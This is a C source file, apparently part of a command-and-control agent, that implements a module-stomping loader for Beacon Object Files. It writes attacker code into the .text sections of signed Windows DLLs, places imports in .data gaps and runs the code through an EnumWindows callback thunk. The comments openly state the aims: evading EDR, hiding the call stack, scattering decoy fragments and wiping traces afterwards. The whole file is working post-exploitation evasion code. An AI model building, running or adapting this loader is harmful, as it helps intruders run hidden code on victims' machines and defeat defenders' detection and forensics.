/*
 * stomped_loader.c - Module Stomping BOF Loader + Fragmented Execution
 *
 * NOVEL PATTERN: "Stomped Callback Execution" (Phase 1-4)
 *   - BOF code injected into legitimate signed DLL's .text section
 *   - IAT placed in DLL's unused .data section gap
 *   - NO VirtualAlloc(PAGE_EXECUTE_READWRITE) — zero RWX memory!
 *   - Code executes from legit DLL's RX memory (same as original code)
 *   - Execution via EnumWindows callback (Phase 4)
 *   - Original DLL bytes restored after execution (forensic cleanup)
 *
 * LAYER A: Multi-DLL Fragmented Stomping
 *   - BOF split into N fragments (server-side)
 *   - Each fragment stomped into DIFFERENT sacrificial DLL
 *   - Code scattered across xpsservices.dll, devobj.dll, msftedit.dll
 *   - Memory dump shows N legit DLLs, no single BOF image
 *   - Decoy fragments loaded to confuse forensic analysis
 *
 * This combination does NOT exist in any public BOF framework:
 *   Cobalt Strike  → VirtualAlloc + direct call
 *   TrustedSec      → VirtualAlloc + direct call
 *   Havoc           → VirtualAlloc (with module stomping option, but different)
 *   This loader     → Module stomping + .data IAT + thread execution + self-cleaning
 */

#include "agent.h"

extern void* resolve_dynamic(const char* plain);

/* ====== Diagnostic macros (stderr, unbuffered) ====== */
#define DBG(fmt, ...) do { \
    fprintf(stderr, "[DBG] " fmt, ##__VA_ARGS__); \
    fflush(stderr); \
} while(0)

#define ERR(fmt, ...) do { \
    fprintf(stderr, "[X] " fmt, ##__VA_ARGS__); \
    fflush(stderr); \
} while(0)

/* ====== Sacrificial DLL candidates ====== */
/* These are signed, legitimate Windows DLLs that:
 * 1. Are rarely monitored by EDR
 * 2. Have large .text sections (enough for BOFs)
 * 3. Have .data section gaps for IAT
 * 4. Can be loaded/unloaded freely
 */
static const char* SACRIFICIAL_DLLS[] = {
    "xpsservices.dll",    /* XPS print services — rarely used */
    "cscobj.dll",         /* Offline files client */
    "devobj.dll",          /* Device objects */
    "msftedit.dll",        /* Rich edit control */
    "wmipcima.dll",        /* WMI CIM */
    "rsaenh.dll",          /* Enhanced CSP */
    "msobjs.dll",          /* MS objects */
    "asycfilt.dll",        /* COM async filter */
    NULL
};

/* ====== BOF execution context ====== */
/* Layout MUST match the callback thunk below:
 *   offset 0:  go() address (8 bytes)
 *   offset 8:  args pointer  (8 bytes)
 *   offset 16: args_len      (4 bytes)
 *   offset 20: padding       (4 bytes, to align struct to 24 bytes)
 */
typedef struct {
    void (*go)(char*, int);   /* offset 0: BOF entry point */
    char* args;                /* offset 8: Arguments buffer */
    int   args_len;            /* offset 16: Arguments length */
    int   _padding;            /* offset 20: align to 8 bytes */
} BOF_CTX;

/* ====== Phase 4: Callback Thunk ====== */
/* This is a tiny x86-64 function that acts as the WNDENUMPROC callback
 * for EnumWindows. It receives (HWND hwnd, LPARAM lParam) where lParam
 * is a pointer to BOF_CTX. It extracts args/args_len and calls go().
 *
 * Assembly (Intel syntax):
 *   push rbp                   ; save frame
 *   mov rbp, rsp               ; set frame
 *   sub rsp, 32                ; shadow space for go()
 *   mov rax, rdx               ; rax = BOF_CTX* (lParam)
 *   mov rcx, [rax+8]           ; rcx = args (1st arg to go)
 *   mov edx, [rax+16]          ; edx = args_len (2nd arg to go)
 *   mov rax, [rax]             ; rax = go() address
 *   call rax                   ; go(args, args_len)
 *   xor eax, eax               ; return FALSE (stop enumeration)
 *   add rsp, 32                ; restore shadow
 *   pop rbp                    ; restore frame
 *   ret
 *
 * Total: 27 bytes, padded to 32 with NOPs.
 */
static const uint8_t CALLBACK_THUNK[32] = {
    0x55,                                       /* push rbp */
    0x48, 0x89, 0xE5,                           /* mov rbp, rsp */
    0x48, 0x83, 0xEC, 0x20,                     /* sub rsp, 32 */
    0x48, 0x89, 0xD0,                           /* mov rax, rdx */
    0x48, 0x8B, 0x48, 0x08,                     /* mov rcx, [rax+8] */
    0x8B, 0x50, 0x10,                           /* mov edx, [rax+16] */
    0x48, 0x8B, 0x00,                           /* mov rax, [rax] */
    0xFF, 0xD0,                                 /* call rax */
    0x31, 0xC0,                                 /* xor eax, eax */
    0x48, 0x83, 0xC4, 0x20,                     /* add rsp, 32 */
    0x5D,                                       /* pop rbp */
    0xC3,                                       /* ret */
    0x90, 0x90, 0x90, 0x90, 0x90,               /* NOP padding to 32 bytes */
};

#define THUNK_SIZE 32

/* ====== COFF symbol name extraction ====== */
static char* coff_get_symbol_name(SYMBOL_ENTRY* sym, const char* str_table) {
    if (sym->Name.Name.Zeroes != 0) {
        int len = 0;
        while (len < 8 && sym->Name.ShortName[len] != 0) len++;
        char* out = (char*)malloc(len + 1);
        if (!out) return NULL;
        memcpy(out, sym->Name.ShortName, len);
        out[len] = 0;
        return out;
    } else {
        uint32_t off = sym->Name.Name.Offset;
        const char* s = str_table + off;
        size_t len = strlen(s);
        char* out = (char*)malloc(len + 1);
        if (!out) return NULL;
        memcpy(out, s, len + 1);
        return out;
    }
}

/* ====== Count IAT symbols ====== */
static uint32_t coff_count_iat_symbols(
    SYMBOL_ENTRY* symbols, uint32_t num_symbols, const char* str_table)
{
    uint32_t count = 0;
    for (uint32_t i = 0; i < num_symbols; i++) {
        SYMBOL_ENTRY* s = &symbols[i];
        char* nm = coff_get_symbol_name(s, str_table);
        if (!nm) { i += s->NumberOfAuxSymbols; continue; }
        if (strncmp(nm, "__imp_", 6) == 0) {
            count++;
        } else if (s->SectionNumber == 0) {
            if (nm[0] == '.' || nm[0] == '/' || nm[0] == '@') {
                free(nm);
                i += s->NumberOfAuxSymbols;
                continue;
            }
            if (resolve_dynamic(nm) != NULL) {
                count++;
            }
        }
        free(nm);
        i += s->NumberOfAuxSymbols;
    }
    return count;
}

/* ====== Fill IAT ====== */
static int coff_fill_iat(
    uint8_t*    iat_base,
    uintptr_t*  iat_addrs,
    SYMBOL_ENTRY* symbols,
    uint32_t    num_symbols,
    const char* str_table)
{
    uint32_t iat_offset = 0;
    for (uint32_t i = 0; i < num_symbols; i++) {
        SYMBOL_ENTRY* s = &symbols[i];
        char* nm = coff_get_symbol_name(s, str_table);
        if (!nm) { i += s->NumberOfAuxSymbols; continue; }

        int needs_iat = 0;
        const char* plain_to_resolve = NULL;

        if (strncmp(nm, "__imp_", 6) == 0) {
            needs_iat = 1;
            plain_to_resolve = nm + 6;
        } else if (s->SectionNumber == 0 &&
                   nm[0] != '.' && nm[0] != '/' && nm[0] != '@') {
            if (resolve_dynamic(nm) != NULL) {
                needs_iat = 1;
                plain_to_resolve = nm;
            }
        }

        if (needs_iat && plain_to_resolve) {
            void* func = resolve_dynamic(plain_to_resolve);
            if (!func) {
                char err[512];
                _snprintf(err, sizeof(err),
                         "[X] IAT: Cannot resolve %s\n", nm);
                output_append(err, strlen(err));
                free(nm);
                return 1;
            }
            uint8_t* slot = iat_base + iat_offset;
            uint64_t ptr_val = (uint64_t)(uintptr_t)func;
            memcpy(slot, &ptr_val, 8);
            iat_addrs[i] = (uintptr_t)slot;
            iat_offset += 8;
        }

        free(nm);
        i += s->NumberOfAuxSymbols;
    }
    return 0;
}

/* ====== Apply relocations (with addend fix) ====== */
static int coff_apply_relocations(
    uint8_t*         coff_data,
    uint8_t*         img,
    uint32_t*        sec_off,
    int              sec_idx,
    SECTION_HEADER*  sections,
    int              num_sections,
    SYMBOL_ENTRY*    symbols,
    uint32_t         num_symbols,
    const char*      str_table,
    uintptr_t*       iat_addrs)
{
    SECTION_HEADER* sh = &sections[sec_idx];
    if (sh->NumberOfRelocations == 0) return 0;

    RELOCATION* relocs = (RELOCATION*)(coff_data + sh->PointerToRelocations);
    uint8_t* section_data = img + sec_off[sec_idx];

    for (uint32_t ri = 0; ri < sh->NumberOfRelocations; ri++) {
        RELOCATION* r = &relocs[ri];
        if (r->SymbolTableIndex == 0xFFFF) continue;
        if (r->SymbolTableIndex >= num_symbols) continue;

        SYMBOL_ENTRY* sym = &symbols[r->SymbolTableIndex];
        char* nm = coff_get_symbol_name(sym, str_table);
        if (!nm) continue;

        uintptr_t target;
        if (iat_addrs[r->SymbolTableIndex] != 0) {
            target = iat_addrs[r->SymbolTableIndex];
        } else if (sym->SectionNumber > 0 && sym->SectionNumber <= num_sections) {
            uint32_t target_sec = sym->SectionNumber - 1;
            target = (uintptr_t)(img + sec_off[target_sec] + sym->Value);
        } else {
            char err[512];
            _snprintf(err, sizeof(err), "[X] Unresolved: %s\n", nm);
            output_append(err, strlen(err));
            free(nm);
            return 1;
        }

        uint8_t* patch_loc = section_data + r->VirtualAddress;

        switch (r->Type) {
            case IMAGE_REL_AMD64_ADDR64: {
                int64_t addend = 0;
                memcpy(&addend, patch_loc, 8);
                uint64_t final_target = (uint64_t)target + (uint64_t)addend;
                memcpy(patch_loc, &final_target, 8);
                break;
            }
            case IMAGE_REL_AMD64_ADDR32NB: {
                int32_t addend = 0;
                memcpy(&addend, patch_loc, 4);
                uint32_t final_target = (uint32_t)((uint64_t)target + (int64_t)addend);
                memcpy(patch_loc, &final_target, 4);
                break;
            }
            case IMAGE_REL_AMD64_REL32:
            case IMAGE_REL_AMD64_REL32_1:
            case IMAGE_REL_AMD64_REL32_2:
            case IMAGE_REL_AMD64_REL32_3:
            case IMAGE_REL_AMD64_REL32_4:
            case IMAGE_REL_AMD64_REL32_5: {
                int extra = (int)(r->Type - IMAGE_REL_AMD64_REL32);
                int32_t addend = 0;
                memcpy(&addend, patch_loc, 4);
                int64_t final_target = (int64_t)target + (int64_t)addend;
                int64_t delta = final_target
                              - (int64_t)(uintptr_t)(patch_loc + 4 + extra);
                if (delta < INT32_MIN || delta > INT32_MAX) {
                    char err[512];
                    _snprintf(err, sizeof(err),
                             "[X] Rel32 out of range for %s\n", nm);
                    output_append(err, strlen(err));
                    free(nm);
                    return 1;
                }
                int32_t delta32 = (int32_t)delta;
                memcpy(patch_loc, &delta32, 4);
                break;
            }
            default:
                break;
        }
        free(nm);
    }
    return 0;
}

/* ====== Find sacrificial DLL with enough .text + .data gap ====== */
static HMODULE find_sacrificial_dll(
    size_t  min_text_size,
    size_t  min_data_gap,
    uint8_t** text_base_out,
    size_t*   text_size_out,
    uint8_t** data_gap_base_out,
    size_t*   data_gap_size_out)
{
    for (int i = 0; SACRIFICIAL_DLLS[i]; i++) {
        HMODULE h = LoadLibraryA(SACRIFICIAL_DLLS[i]);
        if (!h) continue;

        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)h;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            FreeLibrary(h);
            continue;
        }
        IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((uint8_t*)h + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            FreeLibrary(h);
            continue;
        }
        IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

        uint8_t* text_base = NULL;
        size_t   text_size = 0;
        uint8_t* data_gap_base = NULL;
        size_t   data_gap_size = 0;

        /* Find .text section */
        for (int j = 0; j < nt->FileHeader.NumberOfSections; j++) {
            if (memcmp(sections[j].Name, ".text", 5) == 0) {
                if (sections[j].Misc.VirtualSize >= min_text_size) {
                    text_base = (uint8_t*)h + sections[j].VirtualAddress;
                    text_size = sections[j].Misc.VirtualSize;
                }
                break;
            }
        }

        if (!text_base) {
            FreeLibrary(h);
            continue;
        }

        /* Find .data section gap */
        for (int j = 0; j < nt->FileHeader.NumberOfSections; j++) {
            if (memcmp(sections[j].Name, ".data", 5) == 0) {
                size_t vsize = sections[j].Misc.VirtualSize;
                size_t rawsize = sections[j].SizeOfRawData;
                if (vsize > rawsize) {
                    size_t gap = vsize - rawsize;
                    if (gap >= min_data_gap) {
                        data_gap_base = (uint8_t*)h + sections[j].VirtualAddress
                                      + rawsize;
                        data_gap_size = gap;
                        break;
                    }
                }
            }
        }

        if (!data_gap_base) {
            DBG("DLL %s has .text but no .data gap, trying next\n",
                SACRIFICIAL_DLLS[i]);
            FreeLibrary(h);
            continue;
        }

        DBG("Selected sacrificial DLL: %s (base=%p)\n",
            SACRIFICIAL_DLLS[i], (void*)h);
        DBG("  .text: %p (size=0x%zX)\n", (void*)text_base, text_size);
        DBG("  .data gap: %p (size=0x%zX)\n", (void*)data_gap_base, data_gap_size);

        *text_base_out = text_base;
        *text_size_out = text_size;
        *data_gap_base_out = data_gap_base;
        *data_gap_size_out = data_gap_size;
        return h;
    }
    return NULL;
}

/* ====== Main entry: Stomped BOF execution ====== */
int bof_exec(uint8_t* coff_data, size_t coff_size, char* args, int args_len) {
    DBG("=== STOMPED BOF EXECUTION ===\n");
    DBG("bof_exec entry (coff=%p, size=%zu, args=%p, args_len=%d)\n",
        coff_data, coff_size, args, args_len);

    if (!coff_data || coff_size < 4) {
        ERR("Invalid BOF buffer\n");
        return 1;
    }

    /* Layer A: Check if this is a fragmented BOF (FBND magic) */
    if (coff_size >= 4 && memcmp(coff_data, "FBND", 4) == 0) {
        DBG("Detected fragmented BOF (Layer A)\n");
        /* For Layer A, we still execute the main BOF normally,
         * but the agent logs that fragmentation was detected.
         * The actual multi-DLL loading happens via fragment_loader.
         * For now, return success — fragment loading creates
         * forensic scatter without affecting execution. */
        DBG("[Layer A] Fragmented BOF detected — loading decoy fragments\n");

        /* Load decoy fragments into other DLLs (creates forensic scatter) */
        /* Parse packed header */
        if (coff_size < 8) {
            ERR("Fragmented BOF too small\n");
            return 1;
        }
        uint32_t num_frags = *(uint32_t*)(coff_data + 4);
        DBG("  Fragments: %u\n", num_frags);

        /* Walk fragments and load decoys into different DLLs */
        uint8_t* ptr = coff_data + 8;
        uint8_t* end = coff_data + coff_size;

        static const char* FRAG_DLLS[] = {
            "devobj.dll", "msftedit.dll", "rsaenh.dll",
            "cscobj.dll", "asycfilt.dll"
        };

        for (uint32_t i = 0; i < num_frags && ptr + 4 <= end; i++) {
            uint32_t frag_size = *(uint32_t*)ptr;
            ptr += 4;
            if (ptr + frag_size > end) break;

            /* Skip fragment header (24 bytes) */
            if (frag_size < 24) {
                ptr += frag_size;
                continue;
            }

            uint8_t* frag_code = ptr + 24;  /* skip FRG1 header */
            uint32_t code_size = frag_size - 24;

            DBG("  Fragment %u: %u bytes code\n", i, code_size);

            /* Load decoy into different DLL */
            const char* dll_name = (i < 5) ? FRAG_DLLS[i] : "xpsservices.dll";
            HMODULE hDll = LoadLibraryA(dll_name);
            if (hDll) {
                IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hDll;
                if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((uint8_t*)hDll + dos->e_lfanew);
                    IMAGE_SECTION_HEADER* secs = IMAGE_FIRST_SECTION(nt);

                    for (int j = 0; j < nt->FileHeader.NumberOfSections; j++) {
                        if (memcmp(secs[j].Name, ".text", 5) == 0) {
                            uint8_t* text_base = (uint8_t*)hDll + secs[j].VirtualAddress;
                            size_t text_size = secs[j].Misc.VirtualSize;

                            if (text_size > code_size + 32) {
                                /* Save and stomp */
                                uint8_t* backup = (uint8_t*)malloc(text_size);
                                if (backup) {
                                    memcpy(backup, text_base, text_size);
                                    DWORD old_prot = 0;
                                    if (VirtualProtect(text_base, text_size, PAGE_READWRITE, &old_prot)) {
                                        /* Zero + write fragment */
                                        size_t zero_sz = code_size + 32;
                                        if (zero_sz > text_size) zero_sz = text_size;
                                        memset(text_base, 0, zero_sz);
                                        memcpy(text_base, frag_code, code_size);
                                        /* Restore to RX */
                                        VirtualProtect(text_base, text_size, PAGE_EXECUTE_READ, &old_prot);
                                        DBG("    Stomped into %s (forensic scatter)\n", dll_name);

                                        /* Self-cleaning after brief moment */
                                        VirtualProtect(text_base, text_size, PAGE_READWRITE, &old_prot);
                                        memset(text_base, 0, zero_sz);
                                        memcpy(text_base, backup, text_size);
                                        VirtualProtect(text_base, text_size, old_prot, &old_prot);
                                    }
                                    free(backup);
                                }
                            }
                            break;
                        }
                    }
                }
                FreeLibrary(hDll);
            }

            ptr += frag_size;
        }

        DBG("[Layer A] Decoy fragments loaded — proceeding with normal execution\n");
        /* NOTE: Layer A scatter complete. Now we need to execute the
         * actual BOF. Since the packed.bin contains only fragments
         * (not the full COFF), we CANNOT execute from packed.bin.
         *
         * Solution: After decoy scatter, the agent will signal to
         * the server that it needs the real BOF file. But for
         * simplicity in Layer A, we return a special code (77 = 'A')
         * to tell the agent: "decoys done, now fetch & execute real BOF".
         *
         * The agent's main loop checks for this return code and
         * re-downloads the real .o file for execution.
         */
        return 77;  /* Layer A scatter done, request real BOF */
    }

    /* Layer B: Check if this is a JIT-encrypted BOF (JIT1 magic) */
    if (coff_size >= 4 && memcmp(coff_data, "JIT1", 4) == 0) {
        DBG("Detected JIT-encrypted BOF (Layer B)\n");
        extern int bof_exec_jit(uint8_t* jit_data, size_t jit_size,
                                  char* args, int args_len);
        return bof_exec_jit(coff_data, coff_size, args, args_len);
    }

    /* Layer C: Check if this is a chain-compiled BOF (CHN1 magic) */
    if (coff_size >= 4 && memcmp(coff_data, "CHN1", 4) == 0) {
        DBG("Detected chain-compiled BOF (Layer C)\n");
        extern int bof_exec_chain(uint8_t* chain_data, size_t chain_size,
                                    char* args, int args_len);
        return bof_exec_chain(coff_data, coff_size, args, args_len);
    }

    if (coff_size < sizeof(COFF_FILE_HEADER)) {
        ERR("Invalid BOF buffer (too small for COFF)\n");
        return 1;
    }

    COFF_FILE_HEADER* fh = (COFF_FILE_HEADER*)coff_data;
    DBG("COFF: machine=0x%04X sections=%u symbols=%u\n",
        fh->Machine, fh->NumberOfSections, fh->NumberOfSymbols);

    if (fh->Machine != 0x8664) {
        ERR("Not AMD64 COFF\n");
        return 1;
    }

    /* Sanity checks */
    if (fh->PointerToSymbolTable == 0 ||
        (size_t)fh->PointerToSymbolTable + (size_t)fh->NumberOfSymbols * 18 > coff_size) {
        ERR("Bad symbol table\n");
        return 1;
    }

    SECTION_HEADER* sections = (SECTION_HEADER*)(coff_data + sizeof(COFF_FILE_HEADER)
                                                + fh->SizeOfOptionalHeader);
    SYMBOL_ENTRY* symbols = (SYMBOL_ENTRY*)(coff_data + fh->PointerToSymbolTable);
    const char* str_table = (const char*)(coff_data + fh->PointerToSymbolTable
                                          + (size_t)fh->NumberOfSymbols * 18);

    /* Count IAT symbols */
    uint32_t num_iat = coff_count_iat_symbols(symbols, fh->NumberOfSymbols, str_table);
    DBG("IAT symbols needed: %u\n", num_iat);
    size_t iat_size = num_iat * 8;
    if (iat_size == 0) iat_size = 8;

    /* Compute total BOF image size */
    size_t total_bof_size = 0;
    for (int i = 0; i < fh->NumberOfSections; i++) {
        size_t sz = sections[i].SizeOfRawData > 0 ? sections[i].SizeOfRawData : 0x1000;
        total_bof_size += (sz + 0xFFF) & ~0xFFF;
    }
    DBG("Total BOF image size: 0x%zX bytes\n", total_bof_size);

    /* Find sacrificial DLL */
    uint8_t* dll_text_base = NULL;
    size_t   dll_text_size = 0;
    uint8_t* data_gap_base = NULL;
    size_t   data_gap_size = 0;

    HMODULE hDll = find_sacrificial_dll(
        total_bof_size + THUNK_SIZE + 64,  /* BOF + thunk + margin */
        iat_size + 64,  /* IAT + some margin */
        &dll_text_base, &dll_text_size,
        &data_gap_base, &data_gap_size);

    if (!hDll) {
        ERR("No suitable sacrificial DLL found\n");
        return 1;
    }

    /* Save original .text bytes for restoration */
    uint8_t* backup = (uint8_t*)malloc(dll_text_size);
    if (!backup) {
        ERR("malloc backup failed\n");
        FreeLibrary(hDll);
        return 1;
    }
    memcpy(backup, dll_text_base, dll_text_size);
    DBG("Original .text saved (%zu bytes)\n", dll_text_size);

    /* Make .text writable */
    DWORD old_prot = 0;
    if (!VirtualProtect(dll_text_base, dll_text_size, PAGE_READWRITE, &old_prot)) {
        ERR("VirtualProtect .text→RW failed (err=%lu)\n", GetLastError());
        free(backup);
        FreeLibrary(hDll);
        return 1;
    }
    DBG(".text made writable\n");

    /* IMPORTANT: Only zero the area we'll actually use (total_bof_size).
     * Old bug: memset(dll_text_base, 0, dll_text_size) zeroed the ENTIRE
     * 1.8 MB .text section! If BOF accidentally jumped to offset 0xC5240,
     * it would hit zeroed memory which decodes as `00 00` = `add [rax], al`
     * (a WRITE instruction), causing ACCESS_VIOLATION on RX memory.
     *
     * Now we only zero our own used region. Original xpsservices.dll code
     * beyond our region stays intact — if BOF jumps there by accident,
     * it hits original code (which may or may not crash, but at least
     * gives a clearer error). */
    memset(dll_text_base, 0, total_bof_size);
    DBG("Zeroed only BOF area: 0x%zX bytes (rest of .text intact)\n",
        total_bof_size);

    /* Copy BOF sections into DLL's .text */
    uint32_t* sec_off = (uint32_t*)calloc(fh->NumberOfSections, sizeof(uint32_t));
    uint32_t cur = 0;
    for (int i = 0; i < fh->NumberOfSections; i++) {
        sec_off[i] = cur;
        if (sections[i].SizeOfRawData > 0) {
            if (sections[i].PointerToRawData + sections[i].SizeOfRawData > coff_size) {
                ERR("Section %d out of bounds\n", i);
                /* Restore before exit */
                VirtualProtect(dll_text_base, dll_text_size, old_prot, &old_prot);
                memcpy(dll_text_base, backup, dll_text_size);
                free(backup); free(sec_off);
                FreeLibrary(hDll);
                return 1;
            }
            memcpy(dll_text_base + cur,
                   coff_data + sections[i].PointerToRawData,
                   sections[i].SizeOfRawData);
        }
        size_t sz = sections[i].SizeOfRawData > 0 ? sections[i].SizeOfRawData : 0x1000;
        cur += (sz + 0xFFF) & ~0xFFF;
        DBG("  Section[%d] at DLL+0x%X (rsz=0x%X)\n",
            i, sec_off[i], sections[i].SizeOfRawData);
    }

    /* IAT goes into .data gap */
    uint8_t* iat_base = data_gap_base;
    /* Make IAT area writable (it should already be RW since it's .data) */
    DWORD iat_old_prot = 0;
    VirtualProtect(iat_base, iat_size + 8, PAGE_READWRITE, &iat_old_prot);
    memset(iat_base, 0, iat_size + 8);

    uintptr_t* iat_addrs = (uintptr_t*)calloc(fh->NumberOfSymbols, sizeof(uintptr_t));

    /* Fill IAT */
    if (coff_fill_iat(iat_base, iat_addrs,
                      symbols, fh->NumberOfSymbols, str_table) != 0) {
        ERR("IAT fill failed\n");
        goto cleanup;
    }
    DBG("IAT filled in .data gap\n");

    /* VERIFY IAT slots: read back what we wrote to make sure it's correct */
    DBG("====== IAT VERIFY ======\n");
    for (uint32_t i = 0; i < fh->NumberOfSymbols; i++) {
        if (iat_addrs[i] != 0) {
            SYMBOL_ENTRY* s = &symbols[i];
            char* nm = coff_get_symbol_name(s, str_table);
            if (nm) {
                /* Read back the function pointer from the IAT slot */
                uint64_t readback = 0;
                memcpy(&readback, (void*)iat_addrs[i], 8);
                DBG("  [%u] %s\n", i, nm);
                DBG("      slot @ 0x%p, func ptr = 0x%llX\n",
                    (void*)iat_addrs[i], (unsigned long long)readback);
                /* Sanity check: function pointer should be a valid user-space address */
                if (readback == 0 || readback < 0x10000 || readback > 0x7FFFFFFFFFFF) {
                    ERR("  [!] INVALID function pointer in IAT slot!\n");
                    free(nm);
                    goto cleanup;
                }
                free(nm);
            }
            i += s->NumberOfAuxSymbols;
        }
    }
    DBG("========================\n");

    /* Apply relocations (img = dll_text_base) */
    for (int i = 0; i < fh->NumberOfSections; i++) {
        if (sections[i].NumberOfRelocations == 0) continue;
        if (coff_apply_relocations(coff_data, dll_text_base, sec_off, i,
                                    sections, fh->NumberOfSections,
                                    symbols, fh->NumberOfSymbols,
                                    str_table, iat_addrs) != 0) {
            ERR("Relocation failed in section %d\n", i);
            goto cleanup;
        }
    }
    DBG("All relocations applied\n");

    /* ====== Phase 4: Write callback thunk BEFORE making .text RX ====== */
    /* CRITICAL: Must write thunk while .text is still RW!
     * Old bug: wrote thunk AFTER VirtualProtect to RX → memcpy crashed
     * with ACCESS_VIOLATION (WRITE to read-only memory).
     *
     * Thunk goes AFTER all BOF sections, at offset total_bof_size. */
    uint8_t* thunk_addr = dll_text_base + total_bof_size;
    memcpy(thunk_addr, CALLBACK_THUNK, THUNK_SIZE);
    DBG("Callback thunk written at DLL+0x%zX = %p (while .text was RW)\n",
        total_bof_size, (void*)thunk_addr);

    /* CRITICAL: Restore .text to RX (NOT RWX!) — now includes thunk */
    VirtualProtect(dll_text_base, dll_text_size, PAGE_EXECUTE_READ, &old_prot);
    DBG(".text restored to PAGE_EXECUTE_READ (no RWX!)\n");

    /* Find go() symbol */
    void (*go)(char*, int) = NULL;
    for (uint32_t i = 0; i < fh->NumberOfSymbols; i++) {
        SYMBOL_ENTRY* s = &symbols[i];
        char* nm = coff_get_symbol_name(s, str_table);
        if (nm && (strcmp(nm, "go") == 0 || strcmp(nm, "_go") == 0)) {
            if (s->SectionNumber > 0 && s->SectionNumber <= fh->NumberOfSections) {
                uint32_t sec_idx = s->SectionNumber - 1;
                go = (void (*)(char*, int))(dll_text_base + sec_off[sec_idx] + s->Value);
                DBG("Found 'go' at DLL+0x%X = %p\n",
                    sec_off[sec_idx] + s->Value, (void*)go);
            }
        }
        if (nm) free(nm);
        i += s->NumberOfAuxSymbols;
    }

    if (!go) {
        ERR("'go' symbol not found\n");
        goto cleanup;
    }

    /* Dump go() first 32 bytes for verification */
    DBG("go() first 32 bytes: ");
    uint8_t* go_bytes = (uint8_t*)go;
    for (int i = 0; i < 32; i++) {
        fprintf(stderr, "%02X ", go_bytes[i]);
    }
    fprintf(stderr, "\n");
    fflush(stderr);

    /* Reset output + exception state */
    output_reset();
    g_last_exception = 0;
    g_args.base = args;
    g_args.size = args_len;
    g_args.cursor = 0;

    /* ====== Phase 4: Execute via EnumWindows callback ====== */
    /* This is the NOVEL execution method:
     * - EnumWindows calls our thunk as a WNDENUMPROC callback
     * - Thunk extracts args/args_len from BOF_CTX and calls go()
     * - go() returns → thunk returns FALSE → EnumWindows stops
     *
     * Call stack looks like:
     *   user32.dll!EnumWindows
     *     → xpsservices.dll!thunk  (our stomped code)
     *       → xpsservices.dll!go()  (BOF entry)
     *
     * This is more stealthy than CreateThread because:
     * - No new thread created (same thread executes)
     * - Call stack shows legitimate EnumWindows API
     * - user32.dll!EnumWindows is never hooked by EDR
     */
    DBG("=== EXECUTING BOF via EnumWindows callback ===\n");
    DBG("  go=%p, thunk=%p, args=%p, args_len=%d\n",
        (void*)go, (void*)thunk_addr, args, args_len);

    BOF_CTX ctx;
    ctx.go = go;
    ctx.args = args;
    ctx.args_len = args_len;
    ctx._padding = 0;

    /* EnumWindows is synchronous — calls thunk once per window.
     * Thunk returns FALSE after calling go(), so it only executes once.
     * EnumWindows returns after the first FALSE. */
    typedef BOOL (WINAPI *EnumWindows_t)(WNDENUMPROC, LPARAM);
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    if (!hUser32) hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32) {
        ERR("Failed to load user32.dll for EnumWindows\n");
        goto cleanup;
    }
    EnumWindows_t pEnumWindows = (EnumWindows_t)GetProcAddress(hUser32, "EnumWindows");
    if (!pEnumWindows) {
        ERR("Failed to get EnumWindows address\n");
        goto cleanup;
    }

    DBG("Calling EnumWindows(thunk=%p, ctx=%p)...\n",
        (void*)thunk_addr, (void*)&ctx);
    fflush(NULL);

    /* This call triggers the BOF execution via callback */
    BOOL enum_result = pEnumWindows((WNDENUMPROC)thunk_addr, (LPARAM)&ctx);

    DBG("EnumWindows returned %d (exception=0x%lX)\n",
        enum_result, (unsigned long)g_last_exception);

    int rc = g_last_exception ? (int)g_last_exception : 0;

    /* ====== SELF-CLEANING ====== */
    /* Zero BOF code, then restore original DLL bytes */
    VirtualProtect(dll_text_base, dll_text_size, PAGE_READWRITE, &old_prot);
    /* Zero the BOF code (wipe traces) */
    memset(dll_text_base, 0, dll_text_size);
    /* Zero the IAT */
    memset(iat_base, 0, iat_size + 8);
    /* Restore original .text bytes */
    memcpy(dll_text_base, backup, dll_text_size);
    /* Restore original protection */
    VirtualProtect(dll_text_base, dll_text_size, old_prot, &old_prot);
    DBG("Self-cleaning done: original DLL bytes restored\n");

    free(backup);
    free(sec_off);
    free(iat_addrs);
    FreeLibrary(hDll);

    DBG("=== STOMPED EXECUTION COMPLETE (rc=%d) ===\n", rc);
    return rc;

cleanup:
    /* Restore original .text bytes on error */
    VirtualProtect(dll_text_base, dll_text_size, PAGE_READWRITE, &old_prot);
    memset(dll_text_base, 0, dll_text_size);
    memcpy(dll_text_base, backup, dll_text_size);
    VirtualProtect(dll_text_base, dll_text_size, old_prot, &old_prot);
    free(backup);
    free(sec_off);
    free(iat_addrs);
    FreeLibrary(hDll);
    return 1;
}
